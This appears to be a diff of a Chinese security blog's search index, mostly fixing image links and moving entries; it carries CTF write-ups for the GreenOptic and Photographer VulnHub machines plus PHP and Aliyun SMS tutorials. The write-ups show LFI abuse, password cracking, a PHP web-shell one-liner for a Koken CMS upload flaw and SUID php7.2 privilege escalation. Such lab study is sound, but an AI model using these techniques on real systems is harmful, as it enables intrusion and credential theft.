-<p>但是，当我尝试在浏览器中打开它时，它要求输入用户名和密码。<br><img src="https://img.xpctf.cn/img/20200927191518.png-xpctf" alt=""><br>通常，有一个.htaccess文件控制这种身份验证，而有一个.htpasswd文件存储密码。我利用在帐户页面中找到的LFI来读取.htpasswd文件，并获得了哈希密码。<br><img src="https://img.xpctf.cn/img/20200927191652.png-xpctf" alt=""><br>我将此哈希保存到文本文件中，并使用John破解了哈希。</p>
+<p>我们看到另一个名为recoveryplan的子域，我很快将其添加到主机文件中。<br><img src="https://img.xpctf.cn/img/20200927191442.png" alt=""></p>
+<p>但是，当我尝试在浏览器中打开它时，它要求输入用户名和密码。<br><img src="https://img.xpctf.cn/img/20200927191518.png" alt=""><br>通常，有一个.htaccess文件控制这种身份验证，而有一个.htpasswd文件存储密码。我利用在帐户页面中找到的LFI来读取.htpasswd文件，并获得了哈希密码。<br><img src="https://img.xpctf.cn/img/20200927191652.png" alt=""><br>我将此哈希保存到文本文件中，并使用John破解了哈希。</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@kali:~/桌面/vulnhub/greenoptic# echo &#x27;staff:$apr1$YQNFpPkc$rhUZOxRE55Nkl4EDn.1Po.&#x27; &gt; hash.txt</span><br><span class="line">root@kali:~/桌面/vulnhub/greenoptic# cat hash.txt </span><br><span class="line">staff:$apr1$YQNFpPkc$rhUZOxRE55Nkl4EDn.1Po.</span><br><span class="line">root@kali:~/桌面/vulnhub/greenoptic# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span><br><span class="line">Warning: detected hash type &quot;md5crypt&quot;, but the string is also recognized as &quot;md5crypt-long&quot;</span><br><span class="line">Use the &quot;--format=md5crypt-long&quot; option to force loading these as that type instead</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">wheeler          (staff)</span><br><span class="line">1g 0:00:00:00 DONE (2020-08-01 08:26) 2.325g/s 30530p/s 30530c/s 30530C/s yellow7..princess94</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure>
 
-<p>现在，我们可以使用用户名staff和密码wheeler登录网站。登录后，我们会在网站上看到一个phpBB。phpBB是免费的开源公告板软件。它允许您在允许的任何人群中共享消息和公告。<br><img src="https://img.xpctf.cn/img/20200927192005.png-xpctf" alt=""></p>
-<p>如果我们查看最新帖子，就会发现该用户正在讨论对其公司的最新攻击，并且还共享一个名为dpi.zip的zip文件，并且该zip文件的密码已通过电子邮件发送给用户Sam。<br><img src="https://img.xpctf.cn/img/20200927192031.png-xpctf" alt=""><br>在互联网上搜索后，我发现所有邮件都存储在/var/mail目录，并使用用户名作为文件名保存。所以我再次使用文件包含(LFI)来读取/var/mail/sam的内容。<br><img src="https://img.xpctf.cn/img/20200927192230.png-xpctf" alt=""></p>
+<p>现在，我们可以使用用户名staff和密码wheeler登录网站。登录后，我们会在网站上看到一个phpBB。phpBB是免费的开源公告板软件。它允许您在允许的任何人群中共享消息和公告。<br><img src="https://img.xpctf.cn/img/20200927192005.png" alt=""></p>
+<p>如果我们查看最新帖子，就会发现该用户正在讨论对其公司的最新攻击，并且还共享一个名为dpi.zip的zip文件，并且该zip文件的密码已通过电子邮件发送给用户Sam。<br><img src="https://img.xpctf.cn/img/20200927192031.png" alt=""><br>在互联网上搜索后，我发现所有邮件都存储在/var/mail目录，并使用用户名作为文件名保存。所以我再次使用文件包含(LFI)来读取/var/mail/sam的内容。<br><img src="https://img.xpctf.cn/img/20200927192230.png" alt=""></p>
 <p>现在，我下载了zip文件，并使用密码HelloSunshine123 提取了该zip文件。解压缩后，我们得到一个dpi.pcap文件。</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Enter host password for user &#x27;staff&#x27;:#密码不显示</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100 72324  100 72324    0     0  34.4M      0 --:--:-- --:--:-- --:--:-- 34.4M</span><br><span class="line">root@kali:~/桌面/vulnhub/greenoptic# unzip dpi.zip </span><br><span class="line">Archive:  dpi.zip</span><br><span class="line">[dpi.zip] dpi.pcap password: </span><br><span class="line">  inflating: dpi.pcap</span><br></pre></td></tr></table></figure>
 
-<p>我在Wireshark中打开文件并开始分析流量。在分析时，我找到了用户Alex的FTP凭据。<br><img src="https://img.xpctf.cn/img/20200927192846.png-xpctf" alt=""></p>
+<p>我在Wireshark中打开文件并开始分析流量。在分析时，我找到了用户Alex的FTP凭据。<br><img src="https://img.xpctf.cn/img/20200927192846.png" alt=""></p>
 <p>通常，FTP密码与用户密码相同，这意味着我们可以使用用户名alex和密码FwejAASD1通过SSH以用户Alex的身份登录并读取用户的标志。</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@kali:~/桌面/vulnhub/greenoptic# ssh alex@192.168.10.63</span><br><span class="line">alex@192.168.10.63&#x27;s password: </span><br><span class="line">Last login: Sun Sep 27 09:16:03 2020 from 192.168.10.12</span><br><span class="line">[alex@websrv01 ~]$ ls</span><br><span class="line">tmp.pcapng  user.txt</span><br><span class="line">[alex@websrv01 ~]$ cat user.txt </span><br><span class="line">Well done. Now to try and get root access.</span><br><span class="line"></span><br><span class="line">Think outside of the box!</span><br></pre></td></tr></table></figure>
 
@@ -539,7 +539,7 @@
 <p>因此，我退出外壳程序并使用“ ssh -X”再次登录，这将允许我们打开GUI应用程序。然后，我输入wireshark打开Wireshark。</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@kali:~/桌面/vulnhub/greenoptic# ssh -X alex@192.168.10.63</span><br><span class="line">alex@192.168.10.63&#x27;s password: </span><br><span class="line">Last login: Sun Sep 27 12:29:41 2020 from 192.168.10.12</span><br><span class="line">[alex@websrv01 ~]$ id</span><br><span class="line">uid=1002(alex) gid=1002(alex) 组=1002(alex),994(wireshark)</span><br><span class="line">[alex@websrv01 ~]$ wireshark </span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p>打开Wireshark之后，我开始捕获任何流量，并发现一些SMTP身份验证，该身份验证每隔几分钟就会重复一次。<br><img src="https://img.xpctf.cn/img/20200927193306.png-xpctf" alt=""><br>在检查数据包时，我们可以看到一个编码为base64的密码。<br><img src="https://img.xpctf.cn/img/20200927193336.png-xpctf" alt=""><br>解码后，我们获得root的密码</p>
+<p>打开Wireshark之后，我开始捕获任何流量，并发现一些SMTP身份验证，该身份验证每隔几分钟就会重复一次。<br><img src="https://img.xpctf.cn/img/20200927193306.png" alt=""><br>在检查数据包时，我们可以看到一个编码为base64的密码。<br><img src="https://img.xpctf.cn/img/20200927193336.png" alt=""><br>解码后，我们获得root的密码</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@kali:~# echo -n AHJvb3QAQVNmb2pvajJlb3p4Y3p6bWVkbG1lZEFTQVNES29qM28= | base64 -d</span><br><span class="line">rootASfojoj2eozxczzmedlmedASASDKoj3o</span><br></pre></td></tr></table></figure>
 <p>现在我们可以使用su切换root并读取我们的标志！</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[alex@websrv01 ~]$ su -</span><br><span class="line">密码：ASfojoj2eozxczzmedlmedASASDKoj3o</span><br><span class="line">上一次登录：日 9月 27 08:26:05 BST 2020pts/0 上</span><br><span class="line">[root@websrv01 ~]# cat </span><br><span class="line">anaconda-ks.cfg  .bash_logout     .bashrc          .gnupg/          .monit.id        .pki/            root.txt         .viminfo         .xauthF7tYk6     </span><br><span class="line">.bash_history    .bash_profile    .cshrc           .lesshst         .monit.state     .rnd             .tcshrc          .wireshark/      .Xauthority      </span><br><span class="line">[root@websrv01 ~]# cat root.txt </span><br><span class="line">Congratulations on getting root!</span><br><span class="line"></span><br><span class="line">  ____                      ___        _   _      </span><br><span class="line"> / ___|_ __ ___  ___ _ __  / _ \ _ __ | |_(_) ___ </span><br><span class="line">| |  _| &#x27;__/ _ \/ _ \ &#x27;_ \| | | | &#x27;_ \| __| |/ __|</span><br><span class="line">| |_| | | |  __/  __/ | | | |_| | |_) | |_| | (__ </span><br><span class="line"> \____|_|  \___|\___|_| |_|\___/| .__/ \__|_|\___|</span><br><span class="line">                                |_|             </span><br><span class="line">  </span><br><span class="line">You&#x27;ve overcome a series of difficult challenges, so well done!</span><br><span class="line"></span><br><span class="line">I&#x27;m happy to make my CTFs available for free. If you enjoyed doing the CTF, please leave a comment on my blog at https://security.caerdydd.wales - I will be happy for your feedback so I can improve them and make them more enjoyable in the future.</span><br><span class="line"></span><br><span class="line">*********</span><br><span class="line">Kindly place your vote on the poll located here to let me know how difficult you found it: https://security.caerdydd.wales/greenoptic-ctf/</span><br><span class="line">*********</span><br><span class="line"></span><br><span class="line">Thanks,</span><br><span class="line">bootlesshacker</span><br><span class="line">[root@websrv01 ~]# ^C</span><br><span class="line">[root@websrv01 ~]# </span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
@@ -633,7 +633,7 @@
     <content><![CDATA[<blockquote>
 <p>PHP针对MySQL数据库提供的扩展，允许PHP当作MySQL的一个客户端连接MySQL服务端进行操作。</p>
 </blockquote>
-<h2 id="连库基本操作"><a href="#连库基本操作" class="headerlink" title="连库基本操作"></a>连库基本操作</h2><h3 id="开启扩展"><a href="#开启扩展" class="headerlink" title="开启扩展"></a>开启扩展</h3><p>在php.ini搜索php_mysqli.dll，如果没有搜索到新建一行写入extension=php_mysqli.dll，如果存在则删掉前面的’;’<br><img src="https://img.xpctf.cn/img/20200905181302.png-xpctf" alt=""><br>访问phpinfo，搜索mysqli，能搜索到则说明mysqli扩展加载成功。<br><img src="https://img.xpctf.cn/img/20200905181431.png-xpctf" alt=""></p>
+<h2 id="连库基本操作"><a href="#连库基本操作" class="headerlink" title="连库基本操作"></a>连库基本操作</h2><h3 id="开启扩展"><a href="#开启扩展" class="headerlink" title="开启扩展"></a>开启扩展</h3><p>在php.ini搜索php_mysqli.dll，如果没有搜索到新建一行写入extension=php_mysqli.dll，如果存在则删掉前面的’;’<br><img src="https://img.xpctf.cn/img/20200905181302.png" alt=""><br>访问phpinfo，搜索mysqli，能搜索到则说明mysqli扩展加载成功。<br><img src="https://img.xpctf.cn/img/20200905181431.png" alt=""></p>
 <h3 id="连接数据库"><a href="#连接数据库" class="headerlink" title="连接数据库"></a>连接数据库</h3><p>PHP提供了一个面向过程的连接函数：mysqli_connect(服务器地址,用户名,密码,数据库名,端口,socket)，返回一个mysqli对象。</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$like</span> = mysqli_connect(<span class="string">&#x27;localhost&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;mydb&#x27;</span>);</span><br><span class="line">var_dump(<span class="variable">$like</span>);</span><br></pre></td></tr></table></figure>
 
@@ -721,44 +721,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Photographer writeup</title>
-    <url>/posts/cec4/</url>
-    <content><![CDATA[<p>提示：This machine was developed to prepare for OSCP. It is boot2root, tested on VirtualBox (but works on VMWare) and has two flags: user.txt and proof.txt.</p>
-<h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p><strong>靶机</strong><br>IP：未知<br>MAC：00:0C:29:A4:BA:BA<br><strong>kali</strong><br>IP：192.168.1.131<br>MAC：00:0C:29:E2:0D:83</p>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>VMware打开时仅主机模式，把kali设置成仅主机后重新请求DHCP(命令：dhclient)。获取到IP后使用nmap扫描当前网段，根据MAC获取靶机IP。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@kali:~/桌面# nmap -sP 192.168.1.1/24</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-08 11:02 CST</span><br><span class="line">Nmap scan report for 192.168.1.1</span><br><span class="line">Host is up (0.00092s latency).</span><br><span class="line">MAC Address: 00:50:56:C0:00:01 (VMware)</span><br><span class="line">Nmap scan report for 192.168.1.133</span><br><span class="line">Host is up (0.00021s latency).</span><br><span class="line">MAC Address: 00:0C:29:A4:BA:BA (VMware)</span><br><span class="line">Nmap scan report for 192.168.1.254</span><br><span class="line">Host is up (0.00013s latency).</span><br><span class="line">MAC Address: 00:50:56:E9:4B:54 (VMware)</span><br><span class="line">Nmap scan report for 192.168.1.131</span><br><span class="line">Host is up.</span><br><span class="line">Nmap done: 256 IP addresses (4 hosts up) scanned in 28.07 seconds</span><br></pre></td></tr></table></figure>
-<p>根据nmap返回信息确定靶机IP为192.168.1.133，对靶机进行进一步扫描，</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@kali:~/桌面# nmap -T 4 -sV -p- 192.168.1.133</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-08 11:07 CST</span><br><span class="line">Nmap scan report for 192.168.1.133</span><br><span class="line">Host is up (0.00099s latency).</span><br><span class="line">Not shown: 65531 closed ports</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">80/tcp   open  http          Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">139/tcp  open  netbios-ssn   Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp  open  netbios-ssn   Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">8000/tcp open  ssl/http-alt?</span><br><span class="line">MAC Address: 00:0C:29:A4:BA:BA (VMware)</span><br><span class="line">Service Info: Host: PHOTOGRAPHER</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 75.52 seconds</span><br></pre></td></tr></table></figure>
-<p>靶机开放了80，139，445，8000端口。先从80下手吧，浏览器打开看看是什么。</p>
-<p>看了一圈加上目录扫描也没什么东西，暂时放弃，看看8000端口。也是一个网页，是什么暂时不知道，dirseach扫描试试<code>python3 dirsearch.py -u http://192.168.1.133:8000/ -e php -t 20 -x 302,404,301,403</code>，200响应代码如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[15:45:28] Starting: </span><br><span class="line">[15:45:34] 200 - 1020B  - /admin/                                    </span><br><span class="line">[15:45:34] 200 - 1020B  - /admin/?/login         </span><br><span class="line">[15:45:34] 200 - 1020B  - /admin/index.html                                                  </span><br><span class="line">[15:45:36] 200 -  114B  - /app/logs/                                  </span><br><span class="line">[15:45:40] 200 -    3KB - /error/                                            </span><br><span class="line">[15:45:42] 200 -    5KB - /index.php                                                                         </span><br><span class="line">[15:45:45] 200 -    3KB - /pages/admin/</span><br></pre></td></tr></table></figure>
-
-<p>访问admin看到网站后台，随便输入看到是提交到api.php去，但是响应代码是404，试试其他的吧。</p>
-<p>使用enum4linux扫描445端口收集信息，发现了//172.19.4.11/sambashare共享目录。<br>（enum4linux软件kali不自带，如果没有请使用apt安装，ip是因为我修改了网卡变得）<br><img src="https://img.xpctf.cn/img/20200808161410.png" alt=""><br>使用smbclient客户端软件连接到smb共享目录，登录后发现两个文件，使用get下载到本地查看，其中一个目录文件如下：<br><img src="https://img.xpctf.cn/img/20200808161940.png" alt=""><br>是一封邮件，通过收件人确定后台用户邮箱，注意最后一句，Don’t forget your secret, my babygirl ;)，猜测密码是babygirl。使用邮箱账号和我的秘密尝试登陆8000端口网站后台，成功了！<br>找了半天没找到关于之类的说明，然后瞎点了一下头像弹出<img src="https://img.xpctf.cn/img/20200808162726.png" alt="">，点击版本号进入打开了 Koken的官网，目测应该是博客框架，版本是2013年的老版本，0.22.24。</p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>google搜索koken 0.22.24 <a href="https://www.exploit-db.com">https://www.exploit-db.com</a><br>发现任意文件上传漏洞，首先得学会如何看exploit-db的漏洞利用说明</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Steps to exploit:</span><br><span class="line"></span><br><span class="line">1. Create a malicious PHP file with this content:</span><br><span class="line">1.创建一个包含以下内容的恶意PHP文件：</span><br><span class="line"></span><br><span class="line">   &lt;?php system($_GET[&#x27;cmd&#x27;]);?&gt;</span><br><span class="line"></span><br><span class="line">2. Save as &quot;image.php.jpg&quot;</span><br><span class="line">2.另存为“ image.php.jpg”</span><br><span class="line"></span><br><span class="line">3. Authenticated, go to Koken CMS Dashboard, upload your file on &quot;Import Content&quot; button (Library panel) and send the HTTP request to Burp.</span><br><span class="line">3. 通过身份验证后，转到Koken CMS仪表板，在“导入内容”按钮（“库”面板）上上传文件，然后将HTTP请求发送到Burp。</span><br><span class="line"></span><br><span class="line">4. On Burp, rename your file to &quot;image.php&quot;</span><br><span class="line">4.在Burp上，将文件重命名为“ image.php”</span><br><span class="line"></span><br><span class="line">5. On Koken CMS Library, select you file and put the mouse on &quot;Download File&quot; to see where your file is hosted on server.</span><br><span class="line">5.在Koken CMS库上，选择您的文件，然后将鼠标放在“下载文件”上，以查看文件在服务器上的托管位置。</span><br></pre></td></tr></table></figure>
-
-<p>说白了就是告诉你漏洞在哪里，怎么利用，找到上传点和绕过方式上传shell脚本就好了。<br>找了半天也没找到“Import Content”按钮，后来通过Ctrl+f5找到了该按钮(我以为在菜单栏呢)。<br><img src="https://img.xpctf.cn/img/20200808164953.png" alt=""></p>
-<p>写一个一句话保存成123.jpg(随意)，打开burp设置代理后到页面上传，拦截后把jpg后缀改成php<br><img src="https://img.xpctf.cn/img/20200808165450.png" alt=""></p>
-<p>上传完shell打开网站巨慢，不知道为什么。</p>
-<p>上传了很多遍后缀都是jpg，后来是我改错位置了(基础不牢)，仔细看了exploit-db的利用说明发现自己的问题。</p>
-<p><img src="https://img.xpctf.cn/img/20200808172341.png" alt=""></p>
-<p>上传完右边有个连接，复制打开<br><img src="https://img.xpctf.cn/img/20200808172910.png" alt=""></p>
-<p>点击“Download File”提取直链，添加到蚂🗡中，右键虚拟终端<br><img src="https://img.xpctf.cn/img/20200808173202.png" alt=""></p>
-<p>使用finde搜索：find / -name user.txt 2&gt;/dev/null</p>
-<p>发现在/home/daisa/user.txt下，使用cat成功获得第一个flag：d41d8cd98f00b204e9800998ecf8427e<br><img src="https://img.xpctf.cn/img/20200808173936.png" alt=""><br>继续使用相同的方法搜索proof.txt,结果返回为空。先吃饭继续提权</p>
-<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>使用<code>find / -perm -u=s -type f 2&gt;/dev/null</code>命令查找www用户有sudo权限的命令用于提权，最终先择php7.2命令<br><img src="https://img.xpctf.cn/img/20200808194045.png" alt=""><br>在终端中输入<code>/usr/bin/php7.2 -r &quot;pcntl_exec(&#39;/bin/bash&#39;, [&#39;-p&#39;]);&quot;</code>进行权限提升，通过whoami发现没有提权成功。<br><img src="https://img.xpctf.cn/img/20200808194138.png" alt=""><br>使用msfvenom生成反弹shell，上传到服务器成功反弹shell，使用php7.2提权成功。获得proof.txt。<br><img src="https://img.xpctf.cn/img/20200808194419.png" alt=""></p>
-<h2 id="实验总计"><a href="#实验总计" class="headerlink" title="实验总计"></a>实验总计</h2><p>这是我第一次尝试综合靶机，但是难度不算大，我预期的结果是获得完美的root权限的，但是终究力不从心。<br>还得学习！！！</p>
-]]></content>
-      <categories>
-        <category>vulnhub</category>
-      </categories>
-      <tags>
-        <tag>Writeup</tag>
-        <tag>Photographer</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>PHP文件上传项目实战</title>
     <url>/posts/14c3/</url>
     <content><![CDATA[<p>需求：控制上传类型，可选上传后缀，控制上传大小<br>1、前台代码</p>
@@ -780,24 +742,24 @@
 </blockquote>
 <h2 id="开通阿里云短信服务"><a href="#开通阿里云短信服务" class="headerlink" title="开通阿里云短信服务"></a>开通阿里云短信服务</h2><h3 id="登录控制台"><a href="#登录控制台" class="headerlink" title="登录控制台"></a>登录控制台</h3><p>阿里云：<a href="https://www.aliyun.com/">https://www.aliyun.com/</a></p>
 <p>登录阿里云后点击右上角的控制台，点击阿里云logo旁边的菜单按钮，选择””产品与服务”，在搜索框输入”短信”，在”云通信”列表中点击”短信服务”进入短信服务控制台</p>
-<p><img src="https://img.xpctf.cn/img/20201019113913.png-xpctf" alt=""></p>
+<p><img src="https://img.xpctf.cn/img/20201019113913.png" alt=""></p>
 <h3 id="开通短信服务"><a href="#开通短信服务" class="headerlink" title="开通短信服务"></a>开通短信服务</h3><p>首次进入短信服务阿里云会提示你开通短信服务，短信服务按量收费，你不用就不会收费。</p>
 <h3 id="申请签名"><a href="#申请签名" class="headerlink" title="申请签名"></a>申请签名</h3><p>个人用户只能申请一个签名，审核时间过长(2小时左右)，我没法做演示。</p>
 <p>进入控制台后选择”国内消息”，之后选择签名管理，点击添加签名按照要求填写内容即可，签名名称要是有个准确的应用名称，不能出现测试之类的词汇。</p>
-<p><img src="https://img.xpctf.cn/img/20201019115438.png-xpctf" alt=""></p>
+<p><img src="https://img.xpctf.cn/img/20201019115438.png" alt=""></p>
 <p>审核通过的签名</p>
-<p><img src="https://img.xpctf.cn/img/20201019114950.png-xpctf" alt=""></p>
+<p><img src="https://img.xpctf.cn/img/20201019114950.png" alt=""></p>
 <h3 id="申请模板"><a href="#申请模板" class="headerlink" title="申请模板"></a>申请模板</h3><p>模板是你短信内容的格式，格式为：【签名名称】模板内容</p>
-<p><img src="https://img.xpctf.cn/img/20201019115223.png-xpctf" alt=""></p>
+<p><img src="https://img.xpctf.cn/img/20201019115223.png" alt=""></p>
 <p>进入控制台后选择”模板管理”，之后点击”添加模板”,按照填写要求填写模板即可，”${code}”是有个验证码变量，”code”是变量名，调用的使用要对应你得模板变量名。</p>
-<p><img src="https://img.xpctf.cn/img/20201019115345.png-xpctf" alt=""></p>
+<p><img src="https://img.xpctf.cn/img/20201019115345.png" alt=""></p>
 <h2 id="创建AccessKey"><a href="#创建AccessKey" class="headerlink" title="创建AccessKey"></a>创建AccessKey</h2><blockquote>
 <p>AccessKey用于调用阿里云短信服务器的密钥</p>
 </blockquote>
 <p>点击你的用户头像，选择”AccessKey管理”</p>
-<p><img src="https://img.xpctf.cn/img/20201019131710.png-xpctf" alt=""></p>
+<p><img src="https://img.xpctf.cn/img/20201019131710.png" alt=""></p>
 <p>进入后如果你没有RAM 子用户，阿里云会询问你是否创建RAM 子用户，我也搞不懂RAM 子用户是什么东西，反正我不用，选择”继续使用AccessKey”</p>
-<p><img src="https://img.xpctf.cn/img/20201019120353.png-xpctf" alt=""></p>
+<p><img src="https://img.xpctf.cn/img/20201019120353.png" alt=""></p>
 <p>创建删除AccessKey属于敏感操作，所以要验证用户手机号，点击”创建AccessKey”，验证手机号后即可创建成功，这时候会弹出AccesKey的ACCESS_KEY_ID和ACCESS_KEY_SECRET，把它们复制下来，调用的时候需要用到。(保护好自己AccessKey)</p>
 <h2 id="Python调用"><a href="#Python调用" class="headerlink" title="Python调用"></a>Python调用</h2><h3 id="充值阿里云"><a href="#充值阿里云" class="headerlink" title="充值阿里云"></a>充值阿里云</h3><p>如果你的阿里云账户没钱的先充一块钱用于支付验证码费用，好像是0.045一条，在控制台点击费用即可充值阿里云余额。</p>
 <h3 id="安装阿里云SDK核心库"><a href="#安装阿里云SDK核心库" class="headerlink" title="安装阿里云SDK核心库"></a>安装阿里云SDK核心库</h3><p>如果您使用的是Python 3.x，执行以下命令按照阿里云SDK核心库：</p>
@@ -849,6 +811,44 @@
       </categories>
       <tags>
         <tag>验证码</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Photographer writeup</title>
+    <url>/posts/cec4/</url>
+    <content><![CDATA[<p>提示：This machine was developed to prepare for OSCP. It is boot2root, tested on VirtualBox (but works on VMWare) and has two flags: user.txt and proof.txt.</p>
+<h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p><strong>靶机</strong><br>IP：未知<br>MAC：00:0C:29:A4:BA:BA<br><strong>kali</strong><br>IP：192.168.1.131<br>MAC：00:0C:29:E2:0D:83</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>VMware打开时仅主机模式，把kali设置成仅主机后重新请求DHCP(命令：dhclient)。获取到IP后使用nmap扫描当前网段，根据MAC获取靶机IP。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@kali:~/桌面# nmap -sP 192.168.1.1/24</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-08 11:02 CST</span><br><span class="line">Nmap scan report for 192.168.1.1</span><br><span class="line">Host is up (0.00092s latency).</span><br><span class="line">MAC Address: 00:50:56:C0:00:01 (VMware)</span><br><span class="line">Nmap scan report for 192.168.1.133</span><br><span class="line">Host is up (0.00021s latency).</span><br><span class="line">MAC Address: 00:0C:29:A4:BA:BA (VMware)</span><br><span class="line">Nmap scan report for 192.168.1.254</span><br><span class="line">Host is up (0.00013s latency).</span><br><span class="line">MAC Address: 00:50:56:E9:4B:54 (VMware)</span><br><span class="line">Nmap scan report for 192.168.1.131</span><br><span class="line">Host is up.</span><br><span class="line">Nmap done: 256 IP addresses (4 hosts up) scanned in 28.07 seconds</span><br></pre></td></tr></table></figure>
+<p>根据nmap返回信息确定靶机IP为192.168.1.133，对靶机进行进一步扫描，</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@kali:~/桌面# nmap -T 4 -sV -p- 192.168.1.133</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-08 11:07 CST</span><br><span class="line">Nmap scan report for 192.168.1.133</span><br><span class="line">Host is up (0.00099s latency).</span><br><span class="line">Not shown: 65531 closed ports</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">80/tcp   open  http          Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">139/tcp  open  netbios-ssn   Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp  open  netbios-ssn   Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">8000/tcp open  ssl/http-alt?</span><br><span class="line">MAC Address: 00:0C:29:A4:BA:BA (VMware)</span><br><span class="line">Service Info: Host: PHOTOGRAPHER</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 75.52 seconds</span><br></pre></td></tr></table></figure>
+<p>靶机开放了80，139，445，8000端口。先从80下手吧，浏览器打开看看是什么。</p>
+<p>看了一圈加上目录扫描也没什么东西，暂时放弃，看看8000端口。也是一个网页，是什么暂时不知道，dirseach扫描试试<code>python3 dirsearch.py -u http://192.168.1.133:8000/ -e php -t 20 -x 302,404,301,403</code>，200响应代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[15:45:28] Starting: </span><br><span class="line">[15:45:34] 200 - 1020B  - /admin/                                    </span><br><span class="line">[15:45:34] 200 - 1020B  - /admin/?/login         </span><br><span class="line">[15:45:34] 200 - 1020B  - /admin/index.html                                                  </span><br><span class="line">[15:45:36] 200 -  114B  - /app/logs/                                  </span><br><span class="line">[15:45:40] 200 -    3KB - /error/                                            </span><br><span class="line">[15:45:42] 200 -    5KB - /index.php                                                                         </span><br><span class="line">[15:45:45] 200 -    3KB - /pages/admin/</span><br></pre></td></tr></table></figure>
+
+<p>访问admin看到网站后台，随便输入看到是提交到api.php去，但是响应代码是404，试试其他的吧。</p>
+<p>使用enum4linux扫描445端口收集信息，发现了//172.19.4.11/sambashare共享目录。<br>（enum4linux软件kali不自带，如果没有请使用apt安装，ip是因为我修改了网卡变得）<br><img src="https://img.xpctf.cn/img/20200808161410.png" alt=""><br>使用smbclient客户端软件连接到smb共享目录，登录后发现两个文件，使用get下载到本地查看，其中一个目录文件如下：<br><img src="https://img.xpctf.cn/img/20200808161940.png" alt=""><br>是一封邮件，通过收件人确定后台用户邮箱，注意最后一句，Don’t forget your secret, my babygirl ;)，猜测密码是babygirl。使用邮箱账号和我的秘密尝试登陆8000端口网站后台，成功了！<br>找了半天没找到关于之类的说明，然后瞎点了一下头像弹出<img src="https://img.xpctf.cn/img/20200808162726.png" alt="">，点击版本号进入打开了 Koken的官网，目测应该是博客框架，版本是2013年的老版本，0.22.24。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>google搜索koken 0.22.24 <a href="https://www.exploit-db.com">https://www.exploit-db.com</a><br>发现任意文件上传漏洞，首先得学会如何看exploit-db的漏洞利用说明</p>
